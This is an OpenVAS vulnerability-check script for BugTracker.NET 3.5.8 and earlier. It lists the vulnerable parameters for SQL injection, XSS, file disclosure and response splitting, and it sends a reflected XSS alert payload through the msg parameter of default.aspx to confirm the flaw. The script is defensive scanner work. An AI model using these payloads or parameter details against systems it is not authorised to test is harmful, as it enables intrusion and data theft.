###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_bugtrackernet_mult_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# BugTracker.NET Multiple Security Vulnerabilities
#
# Authors:
# Sharath S <sharaths@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow attackers to gain sensitive information
  by performing SQL injection, XSS, file disclosure and HTTP response
  splitting attacks on the affected application and execute arbitrary script
  code.
  Impact Level: Application";
tag_affected = "BugTracker.NET version 3.5.8 and prior";
tag_insight = "The flaws are due to improper validation of user supplied input.
  SQL injection:
    - 'row_id.Value', 'sql' parameter in dbutil.cs
  File Disclosure:
    - 'path' parameters in view_web_config.aspx
    - 'which_file', 'file_name', 'path' parameters in edit_custom_html.aspx
    - 'filename', 'path' parameters in download_file.aspx
  Cross Site Scripting:
    - 'tags' parameter in bug_list.cs
    - 'path', 'blame_text' parameter in svn_blame.aspx
    - 'commit1', 'unified_diff_text', 'error' parameters in git_diff.aspx
    - 'Request', 'path' parameters in view_web_config.aspx
    - 'filename', 'path' parameters in download_file.aspx
    - 'path', 'raw_text' parameters in svn_blame.aspx
    - 'msg' parameter in default.aspx
    - 'revision', 'rev' parameters in hg_blame.asp
    - 'qs', 'url' parameters in util.cs
  HTTP Response Splitting:
    - 'url' parameter in util.cs
    - 'bg_id' parameter in delete_subscriber.aspx";
tag_solution = "Upgrade to BugTracker.NET 3.8.9
  For updates refer to http://ifdefined.com/bugtrackernet.html";
tag_summary = "This host is installed with BugTracker.NET and is prone to SQL injection or
  XSS or file disclosure or HTTP response splitting vulnerabilities.";

if(description)
{
  script_id(901303);
  script_version("$Revision: 12 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-11-29 15:57:44 +0530 (Thu, 29 Nov 2012)");
  script_name("BugTracker.NET Multiple Security Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.osvdb.org/87637");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/51292/");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2012/Nov/117");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/118152/bugtracker-sqldisclose.tgz");
  script_xref(name : "URL" , value : "http://www.defensecode.com/public/BugTrackerNet_Security_Audit_Final_Report.pdf");
  script_xref(name : "URL" , value : "http://www.defensecode.com/article/bugtracker.net_multiple_security_vulnerabilities-31");

  script_description(desc);
  script_summary("Check for cross-site scripting vulnerability in BugTracker.NET");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## variable initialization
btnetUrl = "";
btnetPort = 0;

## Get HTTP port
if (!btnetPort = get_http_port(default:80))exit(0);

## check port state
if(!get_port_state(btnetPort))exit(0);

foreach dir (make_list("/btnet", "/bugtrackernet", "", cgi_dirs()))
{
  btnetUrl = dir + "/default.aspx";

  if(http_vuln_check(port:btnetPort, url:btnetUrl, pattern:">BugTracker.NET<",
     check_header:TRUE, extra_check:make_list('"Logon"','>User:<', '>Password:<')))
  {
    ## Construct XSS
    xss = "<script>alert%28'document.cookie'%29</script>";
    btnetUrl = dir + "/default.aspx?msg=" + xss;

    ## Confirm exploit worked properly or not
    if(http_vuln_check(port:btnetPort, url:string(btnetUrl), check_header:TRUE,
       pattern:"<script>alert\('document.cookie'\)</script>"))
    {
      security_hole(btnetPort);
      exit(0);
    }
  }
}
